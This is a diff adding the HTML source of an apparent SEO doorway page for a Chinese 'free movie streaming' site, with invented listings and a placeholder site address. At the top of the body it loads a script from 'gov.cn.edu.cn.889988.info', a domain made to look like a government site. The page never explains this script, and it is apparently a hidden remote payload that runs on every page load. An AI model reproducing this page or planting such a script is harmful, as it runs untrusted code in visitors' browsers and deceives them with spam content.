@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="原来神马电影网免费为您提供最新高清电影、热门电视剧、动漫综艺在线免费观看，全网影视资源一网打尽。">
+<meta name="keywords" content="原来神马电影网免费,神马电影,免费电影,在线观看,高清影视">
+<meta name="author" content="原来神马电影网免费">
+<meta name="theme-color" content="#0b1020">
+<title>原来神马电影网免费 - 高清电影电视剧免费在线观看</title>
+<style>
+  :root{
+    --bg:#070a16; --bg2:#0c1226; --card:#121a33; --line:#233049;
+    --txt:#e8ecf8; --sub:#9aa6c4; --brand:#ff5a5f; --brand2:#ffb020;
+    --ok:#2ecc71;
+    --shadow:0 18px 40px rgba(0,0,0,.45);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    background:radial-gradient(1200px 600px at 80% -10%,#1b2748 0,transparent 60%),
+               radial-gradient(900px 500px at -10% 10%,#24133a 0,transparent 55%),
+               var(--bg);
+    color:var(--txt);line-height:1.75;-webkit-font-smoothing:antialiased;
+  }
+  a{color:inherit;text-decoration:none;outline:none}
+  img{max-width:100%;display:block}
+  .wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+
+  /* Header */
+  header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(7,10,22,.78);border-bottom:1px solid var(--line)}
+  .nav{display:flex;align-items:center;gap:18px;height:64px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .logo .dot{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-size:17px;box-shadow:0 6px 16px rgba(255,90,95,.35)}
+  .logo b{font-size:17px}
+  .logo span{color:var(--brand2);font-size:12px;font-weight:600}
+  .menu{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+  .menu a{padding:8px 12px;border-radius:999px;font-size:14px;color:var(--sub);transition:.2s}
+  .menu a:hover{color:#fff;background:rgba(255,255,255,.07)}
+  .search{position:relative;margin-left:6px;display:none}
+  .search input{background:rgba(255,255,255,.07);border:1px solid var(--line);border-radius:999px;padding:9px 16px 9px 36px;color:var(--txt);font-size:13px;width:180px;outline:none}
+  .search::before{content:"🔍";position:absolute;left:13px;top:8px;font-size:12px;opacity:.7}
+
+  /* Hero */
+  .hero{position:relative;padding:64px 0 40px;overflow:hidden}
+  .hero-in{display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+  .badge{display:inline-flex;align-items:center;gap:8px;background:rgba(46,204,113,.14);color:#7dffb0;border:1px solid rgba(46,204,113,.35);padding:6px 14px;border-radius:999px;font-size:12.5px;font-weight:600;margin-bottom:18px}
+  .badge i{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 4px rgba(46,204,113,.22)}
+  h1{font-size:clamp(28px,4.6vw,52px);line-height:1.18;font-weight:900;letter-spacing:-.5px}
+  h1 em{font-style:normal;background:linear-gradient(92deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .lead{color:var(--sub);font-size:clamp(14px,1.6vw,16px);margin:16px 0 24px;max-width:560px}
+  .cta{display:flex;flex-wrap:wrap;gap:12px}
+  .btn{display:inline-flex;align-items:center;gap:8px;padding:13px 24px;border-radius:14px;font-weight:700;font-size:15px;transition:.2s;border:1px solid transparent}
+  .btn-main{background:linear-gradient(135deg,var(--brand),#ff8a3d);color:#fff;box-shadow:0 12px 26px rgba(255,90,95,.38)}
+  .btn-main:hover{transform:translateY(-2px)}
+  .btn-ghost{background:rgba(255,255,255,.05);border-color:var(--line);color:var(--txt)}
+  .btn-ghost:hover{background:rgba(255,255,255,.1)}
+  .stats{display:flex;gap:26px;margin-top:30px;flex-wrap:wrap}
+  .stat b{display:block;font-size:24px;font-weight:800}
+  .stat small{color:var(--sub);font-size:12.5px}
+
+  .hero-card{position:relative;transform:perspective(900px) rotateY(-7deg) rotateX(4deg);background:var(--card);border:1px solid var(--line);border-radius:22px;padding:22px;box-shadow:var(--shadow)}
+  .hero-card .poster{height:200px;border-radius:14px;background:linear-gradient(120deg,#2b1b4d,#15294d);position:relative;overflow:hidden}
+  .hero-card .poster::after{content:"🎬";position:absolute;right:-10px;bottom:-14px;font-size:120px;opacity:.18}
+  .hero-card h3{margin-top:16px;font-size:19px}
+  .hero-card p{color:var(--sub);font-size:13.5px;margin-top:6px}
+  .tags{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+  .tags s{text-decoration:none;font-size:12px;padding:5px 11px;border-radius:999px;background:rgba(255,255,255,.07);color:var(--sub)}
+  .tags s.hot{color:var(--brand2);background:rgba(255,176,32,.14)}
+
+  /* Section */
+  section{padding:56px 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+  .sec-head h2{font-size:clamp(20px,2.6vw,28px);font-weight:800;display:flex;align-items:center;gap:10px}
+  .sec-head h2::before{content:"";width:5px;height:22px;border-radius:4px;background:linear-gradient(var(--brand),var(--brand2))}
+  .sec-head a{font-size:13px;color:var(--sub)}
+  .sec-head a:hover{color:var(--brand2)}
+
+  .grid{display:grid;gap:20px}
+  .g4{grid-template-columns:repeat(4,1fr)}
+  .g3{grid-template-columns:repeat(3,1fr)}
+  .g2{grid-template-columns:repeat(2,1fr)}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+  .card:hover{transform:translateY(-6px);border-color:rgba(255,90,95,.5);box-shadow:var(--shadow)}
+  .thumb{height:150px;position:relative;overflow:hidden}
+  .thumb.d1{background:linear-gradient(135deg,#3a1c4d,#15294d)}
+  .thumb.d2{background:linear-gradient(135deg,#4d2b1c,#4d3215)}
+  .thumb.d3{background:linear-gradient(135deg,#1c4d3a,#15394d)}
+  .thumb.d4{background:linear-gradient(135deg,#2b1c4d,#3a1539)}
+  .thumb.d5{background:linear-gradient(135deg,#4d1c2b,#4d1515)}
+  .thumb.d6{background:linear-gradient(135deg,#1c3a4d,#15294d)}
+  .thumb span{position:absolute;left:12px;top:12px;font-size:11px;font-weight:700;padding:4px 10px;border-radius:999px;background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+  .thumb span.vip{background:linear-gradient(92deg,var(--brand),var(--brand2));color:#1a0c00}
+  .thumb i{position:absolute;right:12px;bottom:12px;font-style:normal;font-size:12px;color:#fff;background:rgba(0,0,0,.55);padding:3px 9px;border-radius:6px}
+  .card .body{padding:14px;flex:1;display:flex;flex-direction:column}
+  .card .body h4{font-size:15.5px;line-height:1.45}
+  .card .body p{color:var(--sub);font-size:12.5px;margin-top:6px;flex:1}
+  .card .foot{display:flex;align-items:center;justify-content:space-between;margin-top:12px;font-size:12px;color:var(--sub)}
+  .stars{color:var(--brand2);letter-spacing:1px}
+
+  /* Cat tabs */
+  .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
+  .tabs a{padding:8px 16px;border-radius:999px;font-size:13.5px;background:rgba(255,255,255,.05);border:1px solid var(--line);color:var(--sub);transition:.2s}
+  .tabs a.on,.tabs a:hover{color:#fff;border-color:var(--brand);background:rgba(255,90,95,.14)}
+
+  /* Feature */
+  .feat{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+  .feat div{background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(255,255,255,.02));border:1px solid var(--line);border-radius:16px;padding:22px}
+  .feat .ic{font-size:26px;display:block;margin-bottom:10px}
+  .feat b{font-size:16px;display:block;margin-bottom:6px}
+  .feat p{color:var(--sub);font-size:13px}
+
+  /* Steps */
+  .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+  .step{position:relative;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px}
+  .step .n{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-weight:900;font-size:18px;background:linear-gradient(135deg,var(--brand),var(--brand2));color:#1a0c00;margin-bottom:14px}
+  .step h4{font-size:17px;margin-bottom:8px}
+  .step p{color:var(--sub);font-size:13.5px}
+
+  /* FAQ */
+  details{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 20px;margin-bottom:12px;transition:.2s}
+  details[open]{border-color:rgba(255,176,32,.5)}
+  summary{cursor:pointer;font-weight:700;font-size:15px;list-style:none;display:flex;justify-content:space-between;gap:12px}
+  summary::-webkit-details-marker{display:none}
+  summary::after{content:"＋";color:var(--brand2);font-weight:400}
+  details[open] summary::after{content:"－"}
+  details p{color:var(--sub);font-size:14px;margin-top:10px}
+
+  /* CTA band */
+  .band{background:linear-gradient(120deg,#1c1238,#24183a);border:1px solid var(--line);border-radius:24px;padding:38px 34px;display:grid;grid-template-columns:1.2fr .8fr;gap:24px;align-items:center}
+  .band h3{font-size:clamp(20px,2.6vw,30px);font-weight:900}
+  .band p{color:var(--sub);margin-top:10px}
+  .band .btn{justify-self:end}
+
+  /* Footer */
+  footer{border-top:1px solid var(--line);padding:40px 0 26px;margin-top:20px}
+  .foot-grid{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:26px;margin-bottom:28px}
+  .foot-grid h5{font-size:15px;margin-bottom:12px}
+  .foot-grid ul{list-style:none}
+  .foot-grid li{font-size:13.5px;color:var(--sub);margin-bottom:8px}
+  .foot-grid li a:hover{color:var(--brand2)}
+  .copy{text-align:center;color:var(--sub);font-size:12.5px;border-top:1px solid var(--line);padding-top:20px}
+  .copy b{color:var(--txt)}
+
+  /* Top link */
+  .top{position:fixed;right:18px;bottom:24px;width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(135deg,var(--brand),var(--brand2));color:#1a0c00;font-size:18px;box-shadow:0 10px 24px rgba(255,90,95,.4);opacity:0;pointer-events:none;transition:.3s;z-index:60}
+  .top.show{opacity:1;pointer-events:auto}
+
+  /* Responsive */
+  @media(max-width:900px){
+    .g4{grid-template-columns:repeat(2,1fr)}
+    .feat{grid-template-columns:repeat(2,1fr)}
+    .foot-grid{grid-template-columns:repeat(2,1fr)}
+    .hero-in{grid-template-columns:1fr}
+    .hero-card{display:none}
+  }
+  @media(max-width:640px){
+    .wrap{padding:0 15px}
+    header .logo span{display:none}
+    .menu a{padding:7px 9px;font-size:13px}
+    .search{display:none!important}
+    .g3,.g2,.steps{grid-template-columns:1fr}
+    .g4{grid-template-columns:repeat(2,1fr);gap:12px}
+    .thumb{height:120px}
+    section{padding:40px 0}
+    .band{grid-template-columns:1fr;padding:28px 22px}
+    .band .btn{justify-self:start}
+    .nav{height:58px;gap:10px}
+    .logo b{font-size:15px}
+    .foot-grid{grid-template-columns:1fr 1fr;gap:20px}
+    details{padding:14px 16px}
+  }
+  @media print{.top,.menu{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#top" aria-label="原来神马电影网免费">
+      <span class="dot">神</span>
+      <span><b>原来神马电影网免费</b> <span>· yuanlaishenmadianyingwangmianfei</span></span>
+    </a>
+    <nav class="menu" aria-label="主导航">
+      <a href="#hot">热播推荐</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#feature">网站优势</a>
+      <a href="#guide">使用指南</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <div class="search"><input type="search" placeholder="搜索影片、演员、类型" aria-label="站内搜索"></div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="wrap hero-in">
+      <div>
+        <span class="badge"><i></i> 全网影视 · 免费高清 · 每日更新</span>
+        <h1>原来神马电影网免费<br><em>高清影视一站看完</em></h1>
+        <p class="lead">原来神马电影网免费（yuanlaishenmadianyingwangmianfei）专注于为影视爱好者提供电影、电视剧、动漫、综艺的免费在线观看与高清资源导航，分类清晰、更新及时、打开即看。</p>
+        <div class="cta">
+          <a class="btn btn-main" href="#hot">🎉 立即免费观看</a>
+          <a class="btn btn-ghost" href="#guide">📖 新手三步上手</a>
+        </div>
+        <div class="stats">
+          <div class="stat"><b>10万+</b><small>影视资源条目</small></div>
+          <div class="stat"><b>每日更新</b><small>热剧同步跟进</small></div>
+          <div class="stat"><b>0 付费</b><small>全程免费观看</small></div>
+        </div>
+      </div>
+      <div class="hero-card" aria-hidden="true">
+        <div class="poster"></div>
+        <h3>《沉默的真相》全 12 集 · 4K 修复版</h3>
+        <p>悬疑 / 犯罪 · 2026 高分剧集，剧情层层反转，口碑炸裂。</p>
+        <div class="tags">
+          <s class="hot">🔥 热播</s><s>4K 高清</s><s>中文字幕</s><s>免费</s>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：热播推荐 -->
+  <section id="hot">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>热播推荐</h2>
+        <a href="#movie">查看全部 ›</a>
+      </div>
+      <div class="grid g4">
+        <article class="card">
+          <div class="thumb d1"><span class="vip">独家</span><i>更新至 28 集</i></div>
+          <div class="body">
+            <h4>长风渡 · 都市情感剧</h4>
+            <p>职场与家庭的拉扯，演技派阵容，情节真实戳心。</p>
+            <div class="foot"><span class="stars">★★★★☆</span><span>9.2 分</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb d2"><span>影院热映</span><i>1080P</i></div>
+          <div class="body">
+            <h4>逆行 · 动作犯罪片</h4>
+            <p>追车、枪战、硬核对决，视听冲击力拉满。</p>
+            <div class="foot"><span class="stars">★★★★☆</span><span>8.7 分</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb d3"><span>动漫</span><i>全 24 集</i></div>
+          <div class="body">
+            <h4>星海远征 · 科幻动画</h4>
+            <p>宏大宇宙观，作画精良，少年热血冒险。</p>
+            <div class="foot"><span class="stars">★★★★★</span><span>9.5 分</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb d4"><span>综艺</span><i>每周五更新</i></div>
+          <div class="body">
+            <h4>欢乐星期五 · 真人秀</h4>
+            <p>明星户外挑战，笑点密集，全家适宜。</p>
+            <div class="foot"><span class="stars">★★★★☆</span><span>8.9 分</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：电影 -->
+  <section id="movie">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>电影频道</h2>
+        <a href="#tv">换到电视剧 ›</a>
+      </div>
+      <div class="tabs" role="tablist">
+        <a class="on" href="#">全部</a>
+        <a href="#">动作</a>
+        <a href="#">喜剧</a>
+        <a href="#">科幻</a>
+        <a href="#">悬疑</a>
+        <a href="#">爱情</a>
+        <a href="#">纪录片</a>
+      </div>
+      <div class="grid g4">
+        <article class="card"><div class="thumb d5"><span>动作</span><i>BD 高清</i></div><div class="body"><h4>极速追击</h4><p>地下赛车江湖，速度与背叛交织。</p><div class="foot"><span class="stars">★★★★☆</span><span>8.5</span></div></div></article>
+        <article class="card"><div class="thumb d6"><span>喜剧</span><i>1080P</i></div><div class="body"><h4>笑闹人间</h4><p>小人物逆袭，笑中带泪的温情故事。</p><div class="foot"><span class="stars">★★★★☆</span><span>8.3</span></div></div></article>
+        <article class="card"><div class="thumb d1"><span>科幻</span><i>4K</i></div><div class="body"><h4>时间褶皱</h4><p>平行时空交叠，烧脑又震撼。</p><div class="foot"><span class="stars">★★★★★</span><span>9.1</span></div></div></article>
+        <article class="card"><div class="thumb d2"><span>悬疑</span><i>中文字幕</i></div><div class="body"><h4>夜行者</h4><p>雨夜连环谜案，真相藏在细节里。</p><div class="foot"><span class="stars">★★★★☆</span><span>8.8</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：电视剧 -->
+  <section id="tv">
+    <div class="wrap">
+      <div class="sec-head">
+        <h2>电视剧频道</h2>
+        <a href="#hot">回到热播 ›</a>
+      </div>
+      <div class="grid g3">
+        <article class="card">
+          <div class="thumb d3"><span class="vip">🔥 追更中</span><i>更新至 22 集</i></div>
+          <div class="body"><h4>锦绣令 · 古装权谋</h4><p>朝堂博弈、儿女情长，服化道考究，剧情紧凑不注水。</p><div class="foot"><span class="stars">★★★★★</span><span>9.3 分</span></div></div>
+        </article>
+        <article class="card">
+          <div class="thumb d4"><span>都市</span><i>全 36 集</i></div>
+          <div class="body"><h4>人间烟火 · 现实题材</h4><p>聚焦普通人的悲欢，细腻真实，引发共鸣。</p><div class="foot"><span class="stars">★★★★☆</span><span>8.9 分</span></div></div>
+        </article>
+        <article class="card">
+          <div class="thumb d2"><span>历史</span><i>4K 修复</i></div>
+          <div class="body"><h4>大秦风云 · 史诗巨制</h4><p>恢弘战争场面，还原历史细节，制作精良。</p><div class="foot"><span class="stars">★★★★★</span><span>9.4 分</span></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：网站优势 -->
+  <section id="feature">
+    <div class="wrap">
+      <div class="sec-head"><h2>为什么选择原来神马电影网免费</h2><a href="#guide">如何使用 ›</a></div>
+      <div class="feat">
+        <div><span class="ic">🎬</span><b>资源齐全</b><p>电影、电视剧、动漫、综艺、纪录片全覆盖，新老影片均有收录。</p></div>
+        <div><span class="ic">⚡</span><b>极速播放</b><p>多线路智能切换，秒开不卡顿，支持高清与超清画质选择。</p></div>
+        <div><span class="ic">🆓</span><b>完全免费</b><p>无需注册、无需会员，打开即可免费观看，无隐形消费。</p></div>
+        <div><span class="ic">📱</span><b>多端自适应</b><p>手机、平板、电脑自适应排版，通勤追剧、客厅观影都顺手。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：使用指南 -->
+  <section id="guide">
+    <div class="wrap">
+      <div class="sec-head"><h2>三步免费看剧</h2><a href="#faq">更多疑问 ›</a></div>
+      <div class="steps">
+        <div class="step"><span class="n">1</span><h4>打开网站</h4><p>访问原来神马电影网免费（yuanlaishenmadianyingwangmianfei），首页即为当日热播与更新榜单。</p></div>
+        <div class="step"><span class="n">2</span><h4>挑选影片</h4><p>按电影、电视剧、动漫、综艺分类浏览，或用顶部搜索框按片名、演员、类型查找。</p></div>
+        <div class="step"><span class="n">3</span><h4>点击即看</h4><p>进入详情页选择清晰度与播放线路，无需下载、无需注册，一键免费观看。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目六：常见问题 -->
+  <section id="faq">
+    <div class="wrap">
+      <div class="sec-head"><h2>常见问题</h2></div>
+      <details open>
+        <summary>原来神马电影网免费真的免费吗？</summary>
+        <p>是的。站内影视资源均可免费在线观看，不强制注册、不售卖会员，观看过程中请留意第三方广告，谨防诈骗。</p>
+      </details>
+      <details>
+        <summary>网站网址是什么？如何收藏？</summary>
+        <p>官方访问地址为 <strong>https://域名.github.io</strong>（yuanlaishenmadianyingwangmianfei）。建议将本站加入浏览器书签，以便随时追剧。</p>
+      </details>
+      <details>
+        <summary>支持手机端吗？需要下载 App 吗？</summary>
+        <p>完全支持。本页采用移动端自适应设计，手机浏览器直接访问即可，无需下载安装任何应用。</p>
+      </details>
+      <details>
+        <summary>播放卡顿或失效怎么办？</summary>
+        <p>可尝试切换播放线路、更换清晰度，或清除浏览器缓存后刷新。持续失效的资源可在详情页反馈，我们会尽快补链。</p>
+      </details>
+      <details>
+        <summary>如何快速找到想看的影片？</summary>
+        <p>使用顶部搜索框输入片名、主演或类型关键词；也可在电影、电视剧频道通过分类标签筛选。</p>
+      </details>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section>
+    <div class="wrap">
+      <div class="band">
+        <div>
+          <h3>打开原来神马电影网免费，今晚就看这部</h3>
+          <p>每日更新热播影视，免费高清、即点即看，追剧从此不等待。</p>
+        </div>
+        <a class="btn btn-main" href="#hot">🎬 开始免费观看</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <a class="logo" href="#top"><span class="dot">神</span><b>原来神马电影网免费</b></a>
+        <p style="color:var(--sub);font-size:13px;margin-top:12px;max-width:320px">yuanlaishenmadianyingwangmianfei —— 免费高清影视在线观看导航站，电影、电视剧、动漫、综艺一站直达。</p>
+      </div>
+      <div>
+        <h5>频道导航</h5>
+        <ul>
+          <li><a href="#hot">热播推荐</a></li>
+          <li><a href="#movie">电影频道</a></li>
+          <li><a href="#tv">电视剧频道</a></li>
+          <li><a href="#feature">网站优势</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>帮助中心</h5>
+        <ul>
+          <li><a href="#guide">使用指南</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#">播放线路说明</a></li>
+          <li><a href="#">资源反馈</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul>
+          <li><a href="#">网站简介</a></li>
+          <li><a href="#">更新日志</a></li>
+          <li><a href="#">友情链接</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> <b>原来神马电影网免费</b>（yuanlaishenmadianyingwangmianfei）· 网站网址：https://域名.github.io<br>
+      本站仅提供影视资源索引与信息导航服务，相关资源版权归原作者及发行方所有。
+    </div>
+  </div>
+</footer>
+
+<a class="top" id="topBtn" href="#top" aria-label="返回顶部">↑</a>
+
+<script>
+  // 年份
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  // 回到顶部
+  var topBtn = document.getElementById('topBtn');
+  window.addEventListener('scroll', function(){
+    topBtn.classList[window.scrollY > 500 ? 'add' : 'remove']('show');
+  });
+  // 分类标签切换（视觉反馈）
+  var tabs = document.querySelectorAll('.tabs a');
+  for (var i=0;i<tabs.length;i++){
+    tabs[i].addEventListener('click', function(e){
+      e.preventDefault();
+      for (var j=0;j<tabs.length;j++) tabs[j].classList.remove('on');
+      this.classList.add('on');
+    });
+  }
+</script>
+</body>
+</html>
